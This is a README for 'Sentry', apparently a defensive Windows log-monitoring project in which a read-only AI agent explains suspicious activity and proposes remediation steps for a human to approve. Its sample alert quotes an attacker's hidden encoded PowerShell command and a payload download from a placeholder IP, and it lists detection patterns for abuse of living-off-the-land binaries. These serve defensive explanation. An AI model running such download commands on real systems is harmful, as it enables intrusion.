# Sentry

> **A Windows Security Watch Agent.**
> Reads system logs hourly, explains suspicious activity in plain English, proposes a verified response package for human approval, and compiles a monthly hardening posture report.

[![Windows 10/11](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)](#quick-start-deployment)
[![PowerShell 5.1+](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?logo=powershell&logoColor=white)](#the-nine-collector-scripts)
[![Architecture: Read-Only](https://img.shields.io/badge/Architecture-Strictly%20Read--Only-2ea44f)](#the-golden-rule)
[![Harnesses Supported](https://img.shields.io/badge/Harnesses-Claude%20Code%20%7C%20Goose%20%7C%20Copilot%20%7C%20Vibe%20%7C%20Mammoth%20%7C%20Buzz-orange)](#supported-harnesses)

---

## The Golden Rule

```
Sentry reads. You decide. You act.
```

**Sentry never acts on its own.** It has no shell, executes no destructive commands, and is strictly forbidden from improvising PowerShell. It detects, correlates, and explains. Remediation remains strictly in the hands of the human administrator.

---

## Table of Contents

- [Why Sentry?](#why-sentry)
- [How It Works](#how-it-works)
- [Safety & Isolation Model](#safety--isolation-model)
- [The Nine Collector Scripts](#the-nine-collector-scripts)
- [Supported Harnesses](#supported-harnesses)
- [Quick Start Deployment](#quick-start-deployment)
- [Detection & The Defence Package](#detection--the-defence-package)
- [Monthly Hardening Posture](#monthly-hardening-posture)
- [Repository Structure](#repository-structure)
- [Documentation Directory](#documentation-directory)

---

## Why Sentry?

Traditional Antivirus (AV) and Endpoint Detection and Response (EDR) software ask: *"Is this specific file malicious?"* They check signatures, hashes, and real-time execution heuristics.

Sentry asks a different question: **"Does this sequence of ordinary-looking events add up to an attack?"**

- A signed utility (`certutil.exe` or `mshta.exe`) spawned unexpectedly from Microsoft Word or Outlook.
- A hidden PowerShell command line with base64-encoded instructions.
- A newly created scheduled task or startup registry entry immediately following outbound network traffic.
- Quiet tampering with Windows Defender exclusion lists or clearing of security event logs (Event ID 1102).

None of these events necessarily trigger a static file signature. The pattern is the signal. Sentry acts as a vigilant colleague who reads the machine's logs every hour—logs most users never have time to review—and surfaces only what truly matters.

---

## How It Works

Sentry employs a strict **two-tier architecture**:

```
 ┌─────────────────────────────────────────────────────────────┐
 │                  WINDOWS OPERATING SYSTEM                   │
 │                                                             │
 │  Task Scheduler (Runs as low-privilege 'sentry-svc' user)   │
 │   ├─ Hourly:  Invoke-SentryCollection.ps1                   │
 │   │            └─ 5 Read-Only Event/System Collectors       │
 │   └─ Monthly: Invoke-SentryMonthly.ps1                      │
 │                └─ Hardening Posture Collector               │
 │                                                             │
 │  Output Directory: C:\ProgramData\Sentry\collections\       │
 │  (Permissions: sentry-svc can write, but NEVER delete)      │
 └──────────────────────────────┬──────────────────────────────┘
                                │ JSON Evidence Files
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
 │                     AI AGENT HARNESS                        │
 │  (Claude Code, Goose, M365 Copilot, Mistral Vibe, Buzz)     │
 │                                                             │
 │  • Enforced Read-Only: Shell, Write, and Edit tools blocked │
 │  • Analyzes JSON snapshots against threat patterns          │
 │  • Hourly All-Clear: "Nothing of note" (99% of runs)        │
 │  • Anomaly Detected: Compiles a structured Defence Package  │
 │  • Waits for human review and explicit command execution    │
 └─────────────────────────────────────────────────────────────┘
```

---

## Safety & Isolation Model

1. **No Shell Execution for the Agent:**  
   An agent whose job is to detect malicious PowerShell while itself possessing arbitrary PowerShell execution capability is an architectural hazard. Across all supported harnesses, shell execution is denied at the harness or configuration layer.
2. **Separation of Collection and Analysis:**  
   Collection runs via Windows Task Scheduler under a dedicated, low-privilege service account (`sentry-svc`). The AI agent runs in a separate context and only reads the structured JSON output.
3. **Immutable Evidence Trail:**  
   The `C:\ProgramData\Sentry` directory is configured with append/create permissions without delete rights for `sentry-svc`. An attacker cannot manipulate Sentry into deleting its own forensic history.
4. **Honesty About Visibility Gaps:**  
   If an event log or collector script fails, Sentry explicitly flags the omission. Silence from a broken collector is never treated as a clean bill of health.

---

## The Nine Collector Scripts

All collection scripts live in [`scripts/`](scripts/) and are 100% read-only:

| Collector Script | Frequency | Evidence Gathered |
|---|---|---|
| `Get-SecuritySnapshot.ps1` | Hourly | Antivirus product state & health (any vendor via WSC), Defender exclusions, firewall state, tampering flags. |
| `Get-ProcessActivity.ps1` | Hourly | Process creation events (Event ID 4688 / Sysmon 1) with full command lines, parent trees, and signature states. |
| `Get-ScriptActivity.ps1` | Hourly | PowerShell script blocks (Event ID 4104), decoded base64 commands, and AMSI inspection results. |
| `Get-PersistenceCheck.ps1` | Hourly | Registry Run keys, Scheduled Tasks, Windows Services, and Startup directories—diffed against the prior run. |
| `Get-NetworkActivity.ps1` | Hourly | Active TCP/UDP connections mapped to processes, listening ports, and DNS resolution caches. |
| `Get-HardeningPosture.ps1` | Monthly | 60+ Windows security configuration metrics (ASR rules, BitLocker, Credential Guard, SMBv1, UAC). |
| `Invoke-SentryCollection.ps1` | Hourly | Master orchestrator executed by Task Scheduler; outputs JSON snapshot and manifest. |
| `Invoke-SentryMonthly.ps1` | Monthly | Master monthly orchestrator generating posture evaluation data. |
| `Register-SentryTask.ps1` | Once (Setup) | Configures Windows command-line auditing, script-block logging, log sizes, ACLs, and scheduled tasks. |

---

## Supported Harnesses

Sentry has been tailored and validated across six major agent ecosystems:

| Directory | Harness | Enforcement Mechanism | Status |
|---|---|---|---|
| **[`claude-code/`](claude-code/)** | **Claude Code** | Deny-list in `.claude/settings.json` (`Bash`, `Write`, `Edit` denied); dedicated subagent. | Complete |
| **[`goose/`](goose/)** | **Goose** | Pinned recipe file (`sentry-hourly.recipe.yaml`) with read-only filesystem extension; developer shell disabled. | Complete |
| **[`copilot/`](copilot/)** | **M365 Copilot** | Cloud declarative agent (`declarativeAgent.json`); reads evidence synced to SharePoint or read-only MCP. | Complete |
| **[`mistral-vibe/`](mistral-vibe/)** | **Mistral Vibe** | Strict permissions in `config.toml` (`shell = "NEVER"`, `write = "NEVER"`, `edit = "NEVER"`). | Complete |
| **[`mammoth/`](mammoth/)** | **Mammoth** | Pipeline DOT graph with strict human-approval review node and low-privilege execution. | Complete |
| **Root Package** | **Buzz** | Native `.buzzpack`, `sentry.agent.json`, and PNG import package. | Complete |

For architectural comparison and design tradeoffs across harnesses, see **[PORTING-NOTES.md](PORTING-NOTES.md)**.


---

## Quick Start Deployment

Deployment takes approximately 20 minutes. Full details can be found in **[DEPLOY-SENTRY.md](DEPLOY-SENTRY.md)**.

### Step 1: Create the Low-Privilege Collection Account

Open PowerShell **as Administrator**:

```powershell
$pw = Read-Host -AsSecureString "Password for sentry-svc"
New-LocalUser -Name 'sentry-svc' -Password $pw -PasswordNeverExpires `
  -Description 'Sentry read-only security collection'
```

*(Do **not** add `sentry-svc` to Administrators. It only needs Event Log Readers privileges, which Step 2 handles.)*

### Step 2: Configure Auditing & Register Tasks

```powershell
# Copy scripts to ProgramData
New-Item -ItemType Directory -Path "C:\ProgramData\Sentry\scripts" -Force
Copy-Item -Path ".\scripts\*" -Destination "C:\ProgramData\Sentry\scripts" -Recurse

# Execute registration (Run as Administrator)
cd C:\ProgramData\Sentry\scripts
.\Register-SentryTask.ps1 -SentryUser 'sentry-svc'
```

This automates:
- Enabling process creation auditing with full command line capture (Event ID 4688).
- Enabling PowerShell script block logging (Event ID 4104).
- Resizing the Windows Security Event Log to 1 GB (prevents roll-over loss).
- Adding `sentry-svc` to *Event Log Readers* and *Performance Log Users*.
- Establishing ACLs on `C:\ProgramData\Sentry` (write without delete permissions).
- Registering the hourly and monthly Windows Scheduled Tasks.

### Step 3: Install Sysmon (Recommended)

Sysmon provides rich telemetry (parent processes, network socket connections, file hashes).

```powershell
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
wevtutil sl "Microsoft-Windows-Sysmon/Operational" /ms:1073741824
```

### Step 4: Verify Collection

Trigger an immediate manual collection to verify:

```powershell
cd C:\ProgramData\Sentry\scripts
.\Invoke-SentryCollection.ps1
Get-Content "$env:ProgramData\Sentry\collections\*\manifest.json" | Select-Object -Last 20
```

### Step 5: Activate Your Preferred Agent Harness

Navigate to the directory for your harness of choice and follow its `DEPLOY.md`:
- **Claude Code**: See [`claude-code/DEPLOY.md`](claude-code/DEPLOY.md)
- **Goose**: See [`goose/DEPLOY.md`](goose/DEPLOY.md) or [`goose/INSTALL.md`](goose/INSTALL.md)
- **Microsoft Copilot**: See [`copilot/DEPLOY.md`](copilot/DEPLOY.md)
- **Mistral Vibe**: See [`mistral-vibe/DEPLOY.md`](mistral-vibe/DEPLOY.md)
- **Mammoth**: See [`mammoth/DEPLOY.md`](mammoth/DEPLOY.md)
- **Buzz**: Import `sentry.agent.json` or `sentry-1.0.0.buzzpack` directly into Buzz Desktop.

---

## Detection & The Defence Package

During normal hours, Sentry produces an informational one-line all-clear:
> **Sentry:** *Nothing of note. 42 process creations, all signed. No new persistence. AV healthy.*

When suspicious behavior is detected, Sentry issues a structured **Defence Package**:

```markdown
## [HIGH] SENTRY-2026-0914-01: Encoded PowerShell Launched from Outlook

### What happened
A PowerShell command ran with its window hidden and instructions encoded in base64,
spawned by Outlook at 14:22. The decoded command downloaded a payload from a remote IP.

### Why this is a concern
Legitimate software rarely launches hidden, base64-encoded interpreters from email clients.
This pattern matches malicious attachment payload staging.

### What I actually saw
- Timestamp: 2026-09-14 14:22:04 UTC
- Parent: OUTLOOK.EXE (PID 8412) -> Process: powershell.exe (PID 10248)
- Command Line: powershell.exe -WindowStyle Hidden -enc SQBFAFgA...
- Decoded Script: Invoke-WebRequest -Uri "http://198.51.100.24/stage2.ps1" -OutFile "$env:TEMP\update.exe"

### How confident I am
High. Benign software deployments do not originate from Outlook.

### What I suggest
1. Terminate PID 10248:
   Stop-Process -Id 10248 -Force
2. Remove downloaded artifact:
   Remove-Item -Path "$env:TEMP\update.exe" -Force
3. Block remote destination address at host firewall:
   New-NetFirewallRule -DisplayName "Block Malicious IP" -Direction Outbound -RemoteAddress 198.51.100.24 -Action Block

### If you do nothing
The staged binary in %TEMP% will likely attempt execution or establish persistence.

### To proceed
Review the steps above and execute them in an elevated PowerShell terminal. Sentry will not run them for you.
```

---

## Monthly Hardening Posture

On the first Monday of each month, Sentry runs `Get-HardeningPosture.ps1` to audit system configurations against CIS and Microsoft security baselines:
- Attack Surface Reduction (ASR) rules
- PowerShell Constrained Language Mode
- SMBv1 / LLMNR / NetBIOS disabling
- UAC and Credential Guard configurations
- Windows Update & reboot posture

The output is presented as an actionable checklist ranked by **security gain vs. disruption risk**, complete with rollback commands for each recommended adjustment.

---

## Repository Structure

```
Sentry/
├── README.md                      # Primary project overview and documentation
├── WHAT-IS-SENTRY.md              # Deep-dive philosophy, threat model, and boundaries
├── DEPLOY-SENTRY.md               # End-to-end Windows setup guide
├── PORTING-NOTES.md               # Harness comparison & sandbox enforcement analysis
├── instructions.md                # Core agent operational rules & constraints
├── sentry.persona.md              # Canonical agent prompt / persona definition
│
├── scripts/                       # The 9 core PowerShell collection scripts
│   ├── Get-SecuritySnapshot.ps1
│   ├── Get-ProcessActivity.ps1
│   ├── Get-ScriptActivity.ps1
│   ├── Get-PersistenceCheck.ps1
│   ├── Get-NetworkActivity.ps1
│   ├── Get-HardeningPosture.ps1
│   ├── Invoke-SentryCollection.ps1
│   ├── Invoke-SentryMonthly.ps1
│   └── Register-SentryTask.ps1
│
├── avatars/                       # Visual avatars (home & work styles)
│
├── claude-code/                   # Claude Code harness port
├── copilot/                       # Microsoft 365 Copilot harness port
├── goose/                         # Goose agent harness port
├── mammoth/                       # Mammoth pipeline harness port
├── mistral-vibe/                  # Mistral Vibe harness port
│
├── sentry-1.0.0.buzzpack          # Buzz CLI package
├── sentry-1.0.0.buzzpack.sha256   # Buzz package SHA256 checksum
├── sentry-1.0.0.zip               # Portable archive
├── sentry.agent.json              # Buzz GUI import manifest
└── sentry.agent.png               # PNG-wrapped Buzz agent import
```

---

## Documentation Directory

- **[WHAT-IS-SENTRY.md](WHAT-IS-SENTRY.md)** — Architectural principles, threat modeling, and design justification.
- **[DEPLOY-SENTRY.md](DEPLOY-SENTRY.md)** — Step-by-step Windows configuration guide.
- **[PORTING-NOTES.md](PORTING-NOTES.md)** — Technical details on how "no shell" read-only enforcement is achieved across harnesses.
- **[instructions.md](instructions.md)** — Operating rules and boundaries governing Sentry's analysis.

---

## License

MIT License. See individual script headers for copyright and distribution details.

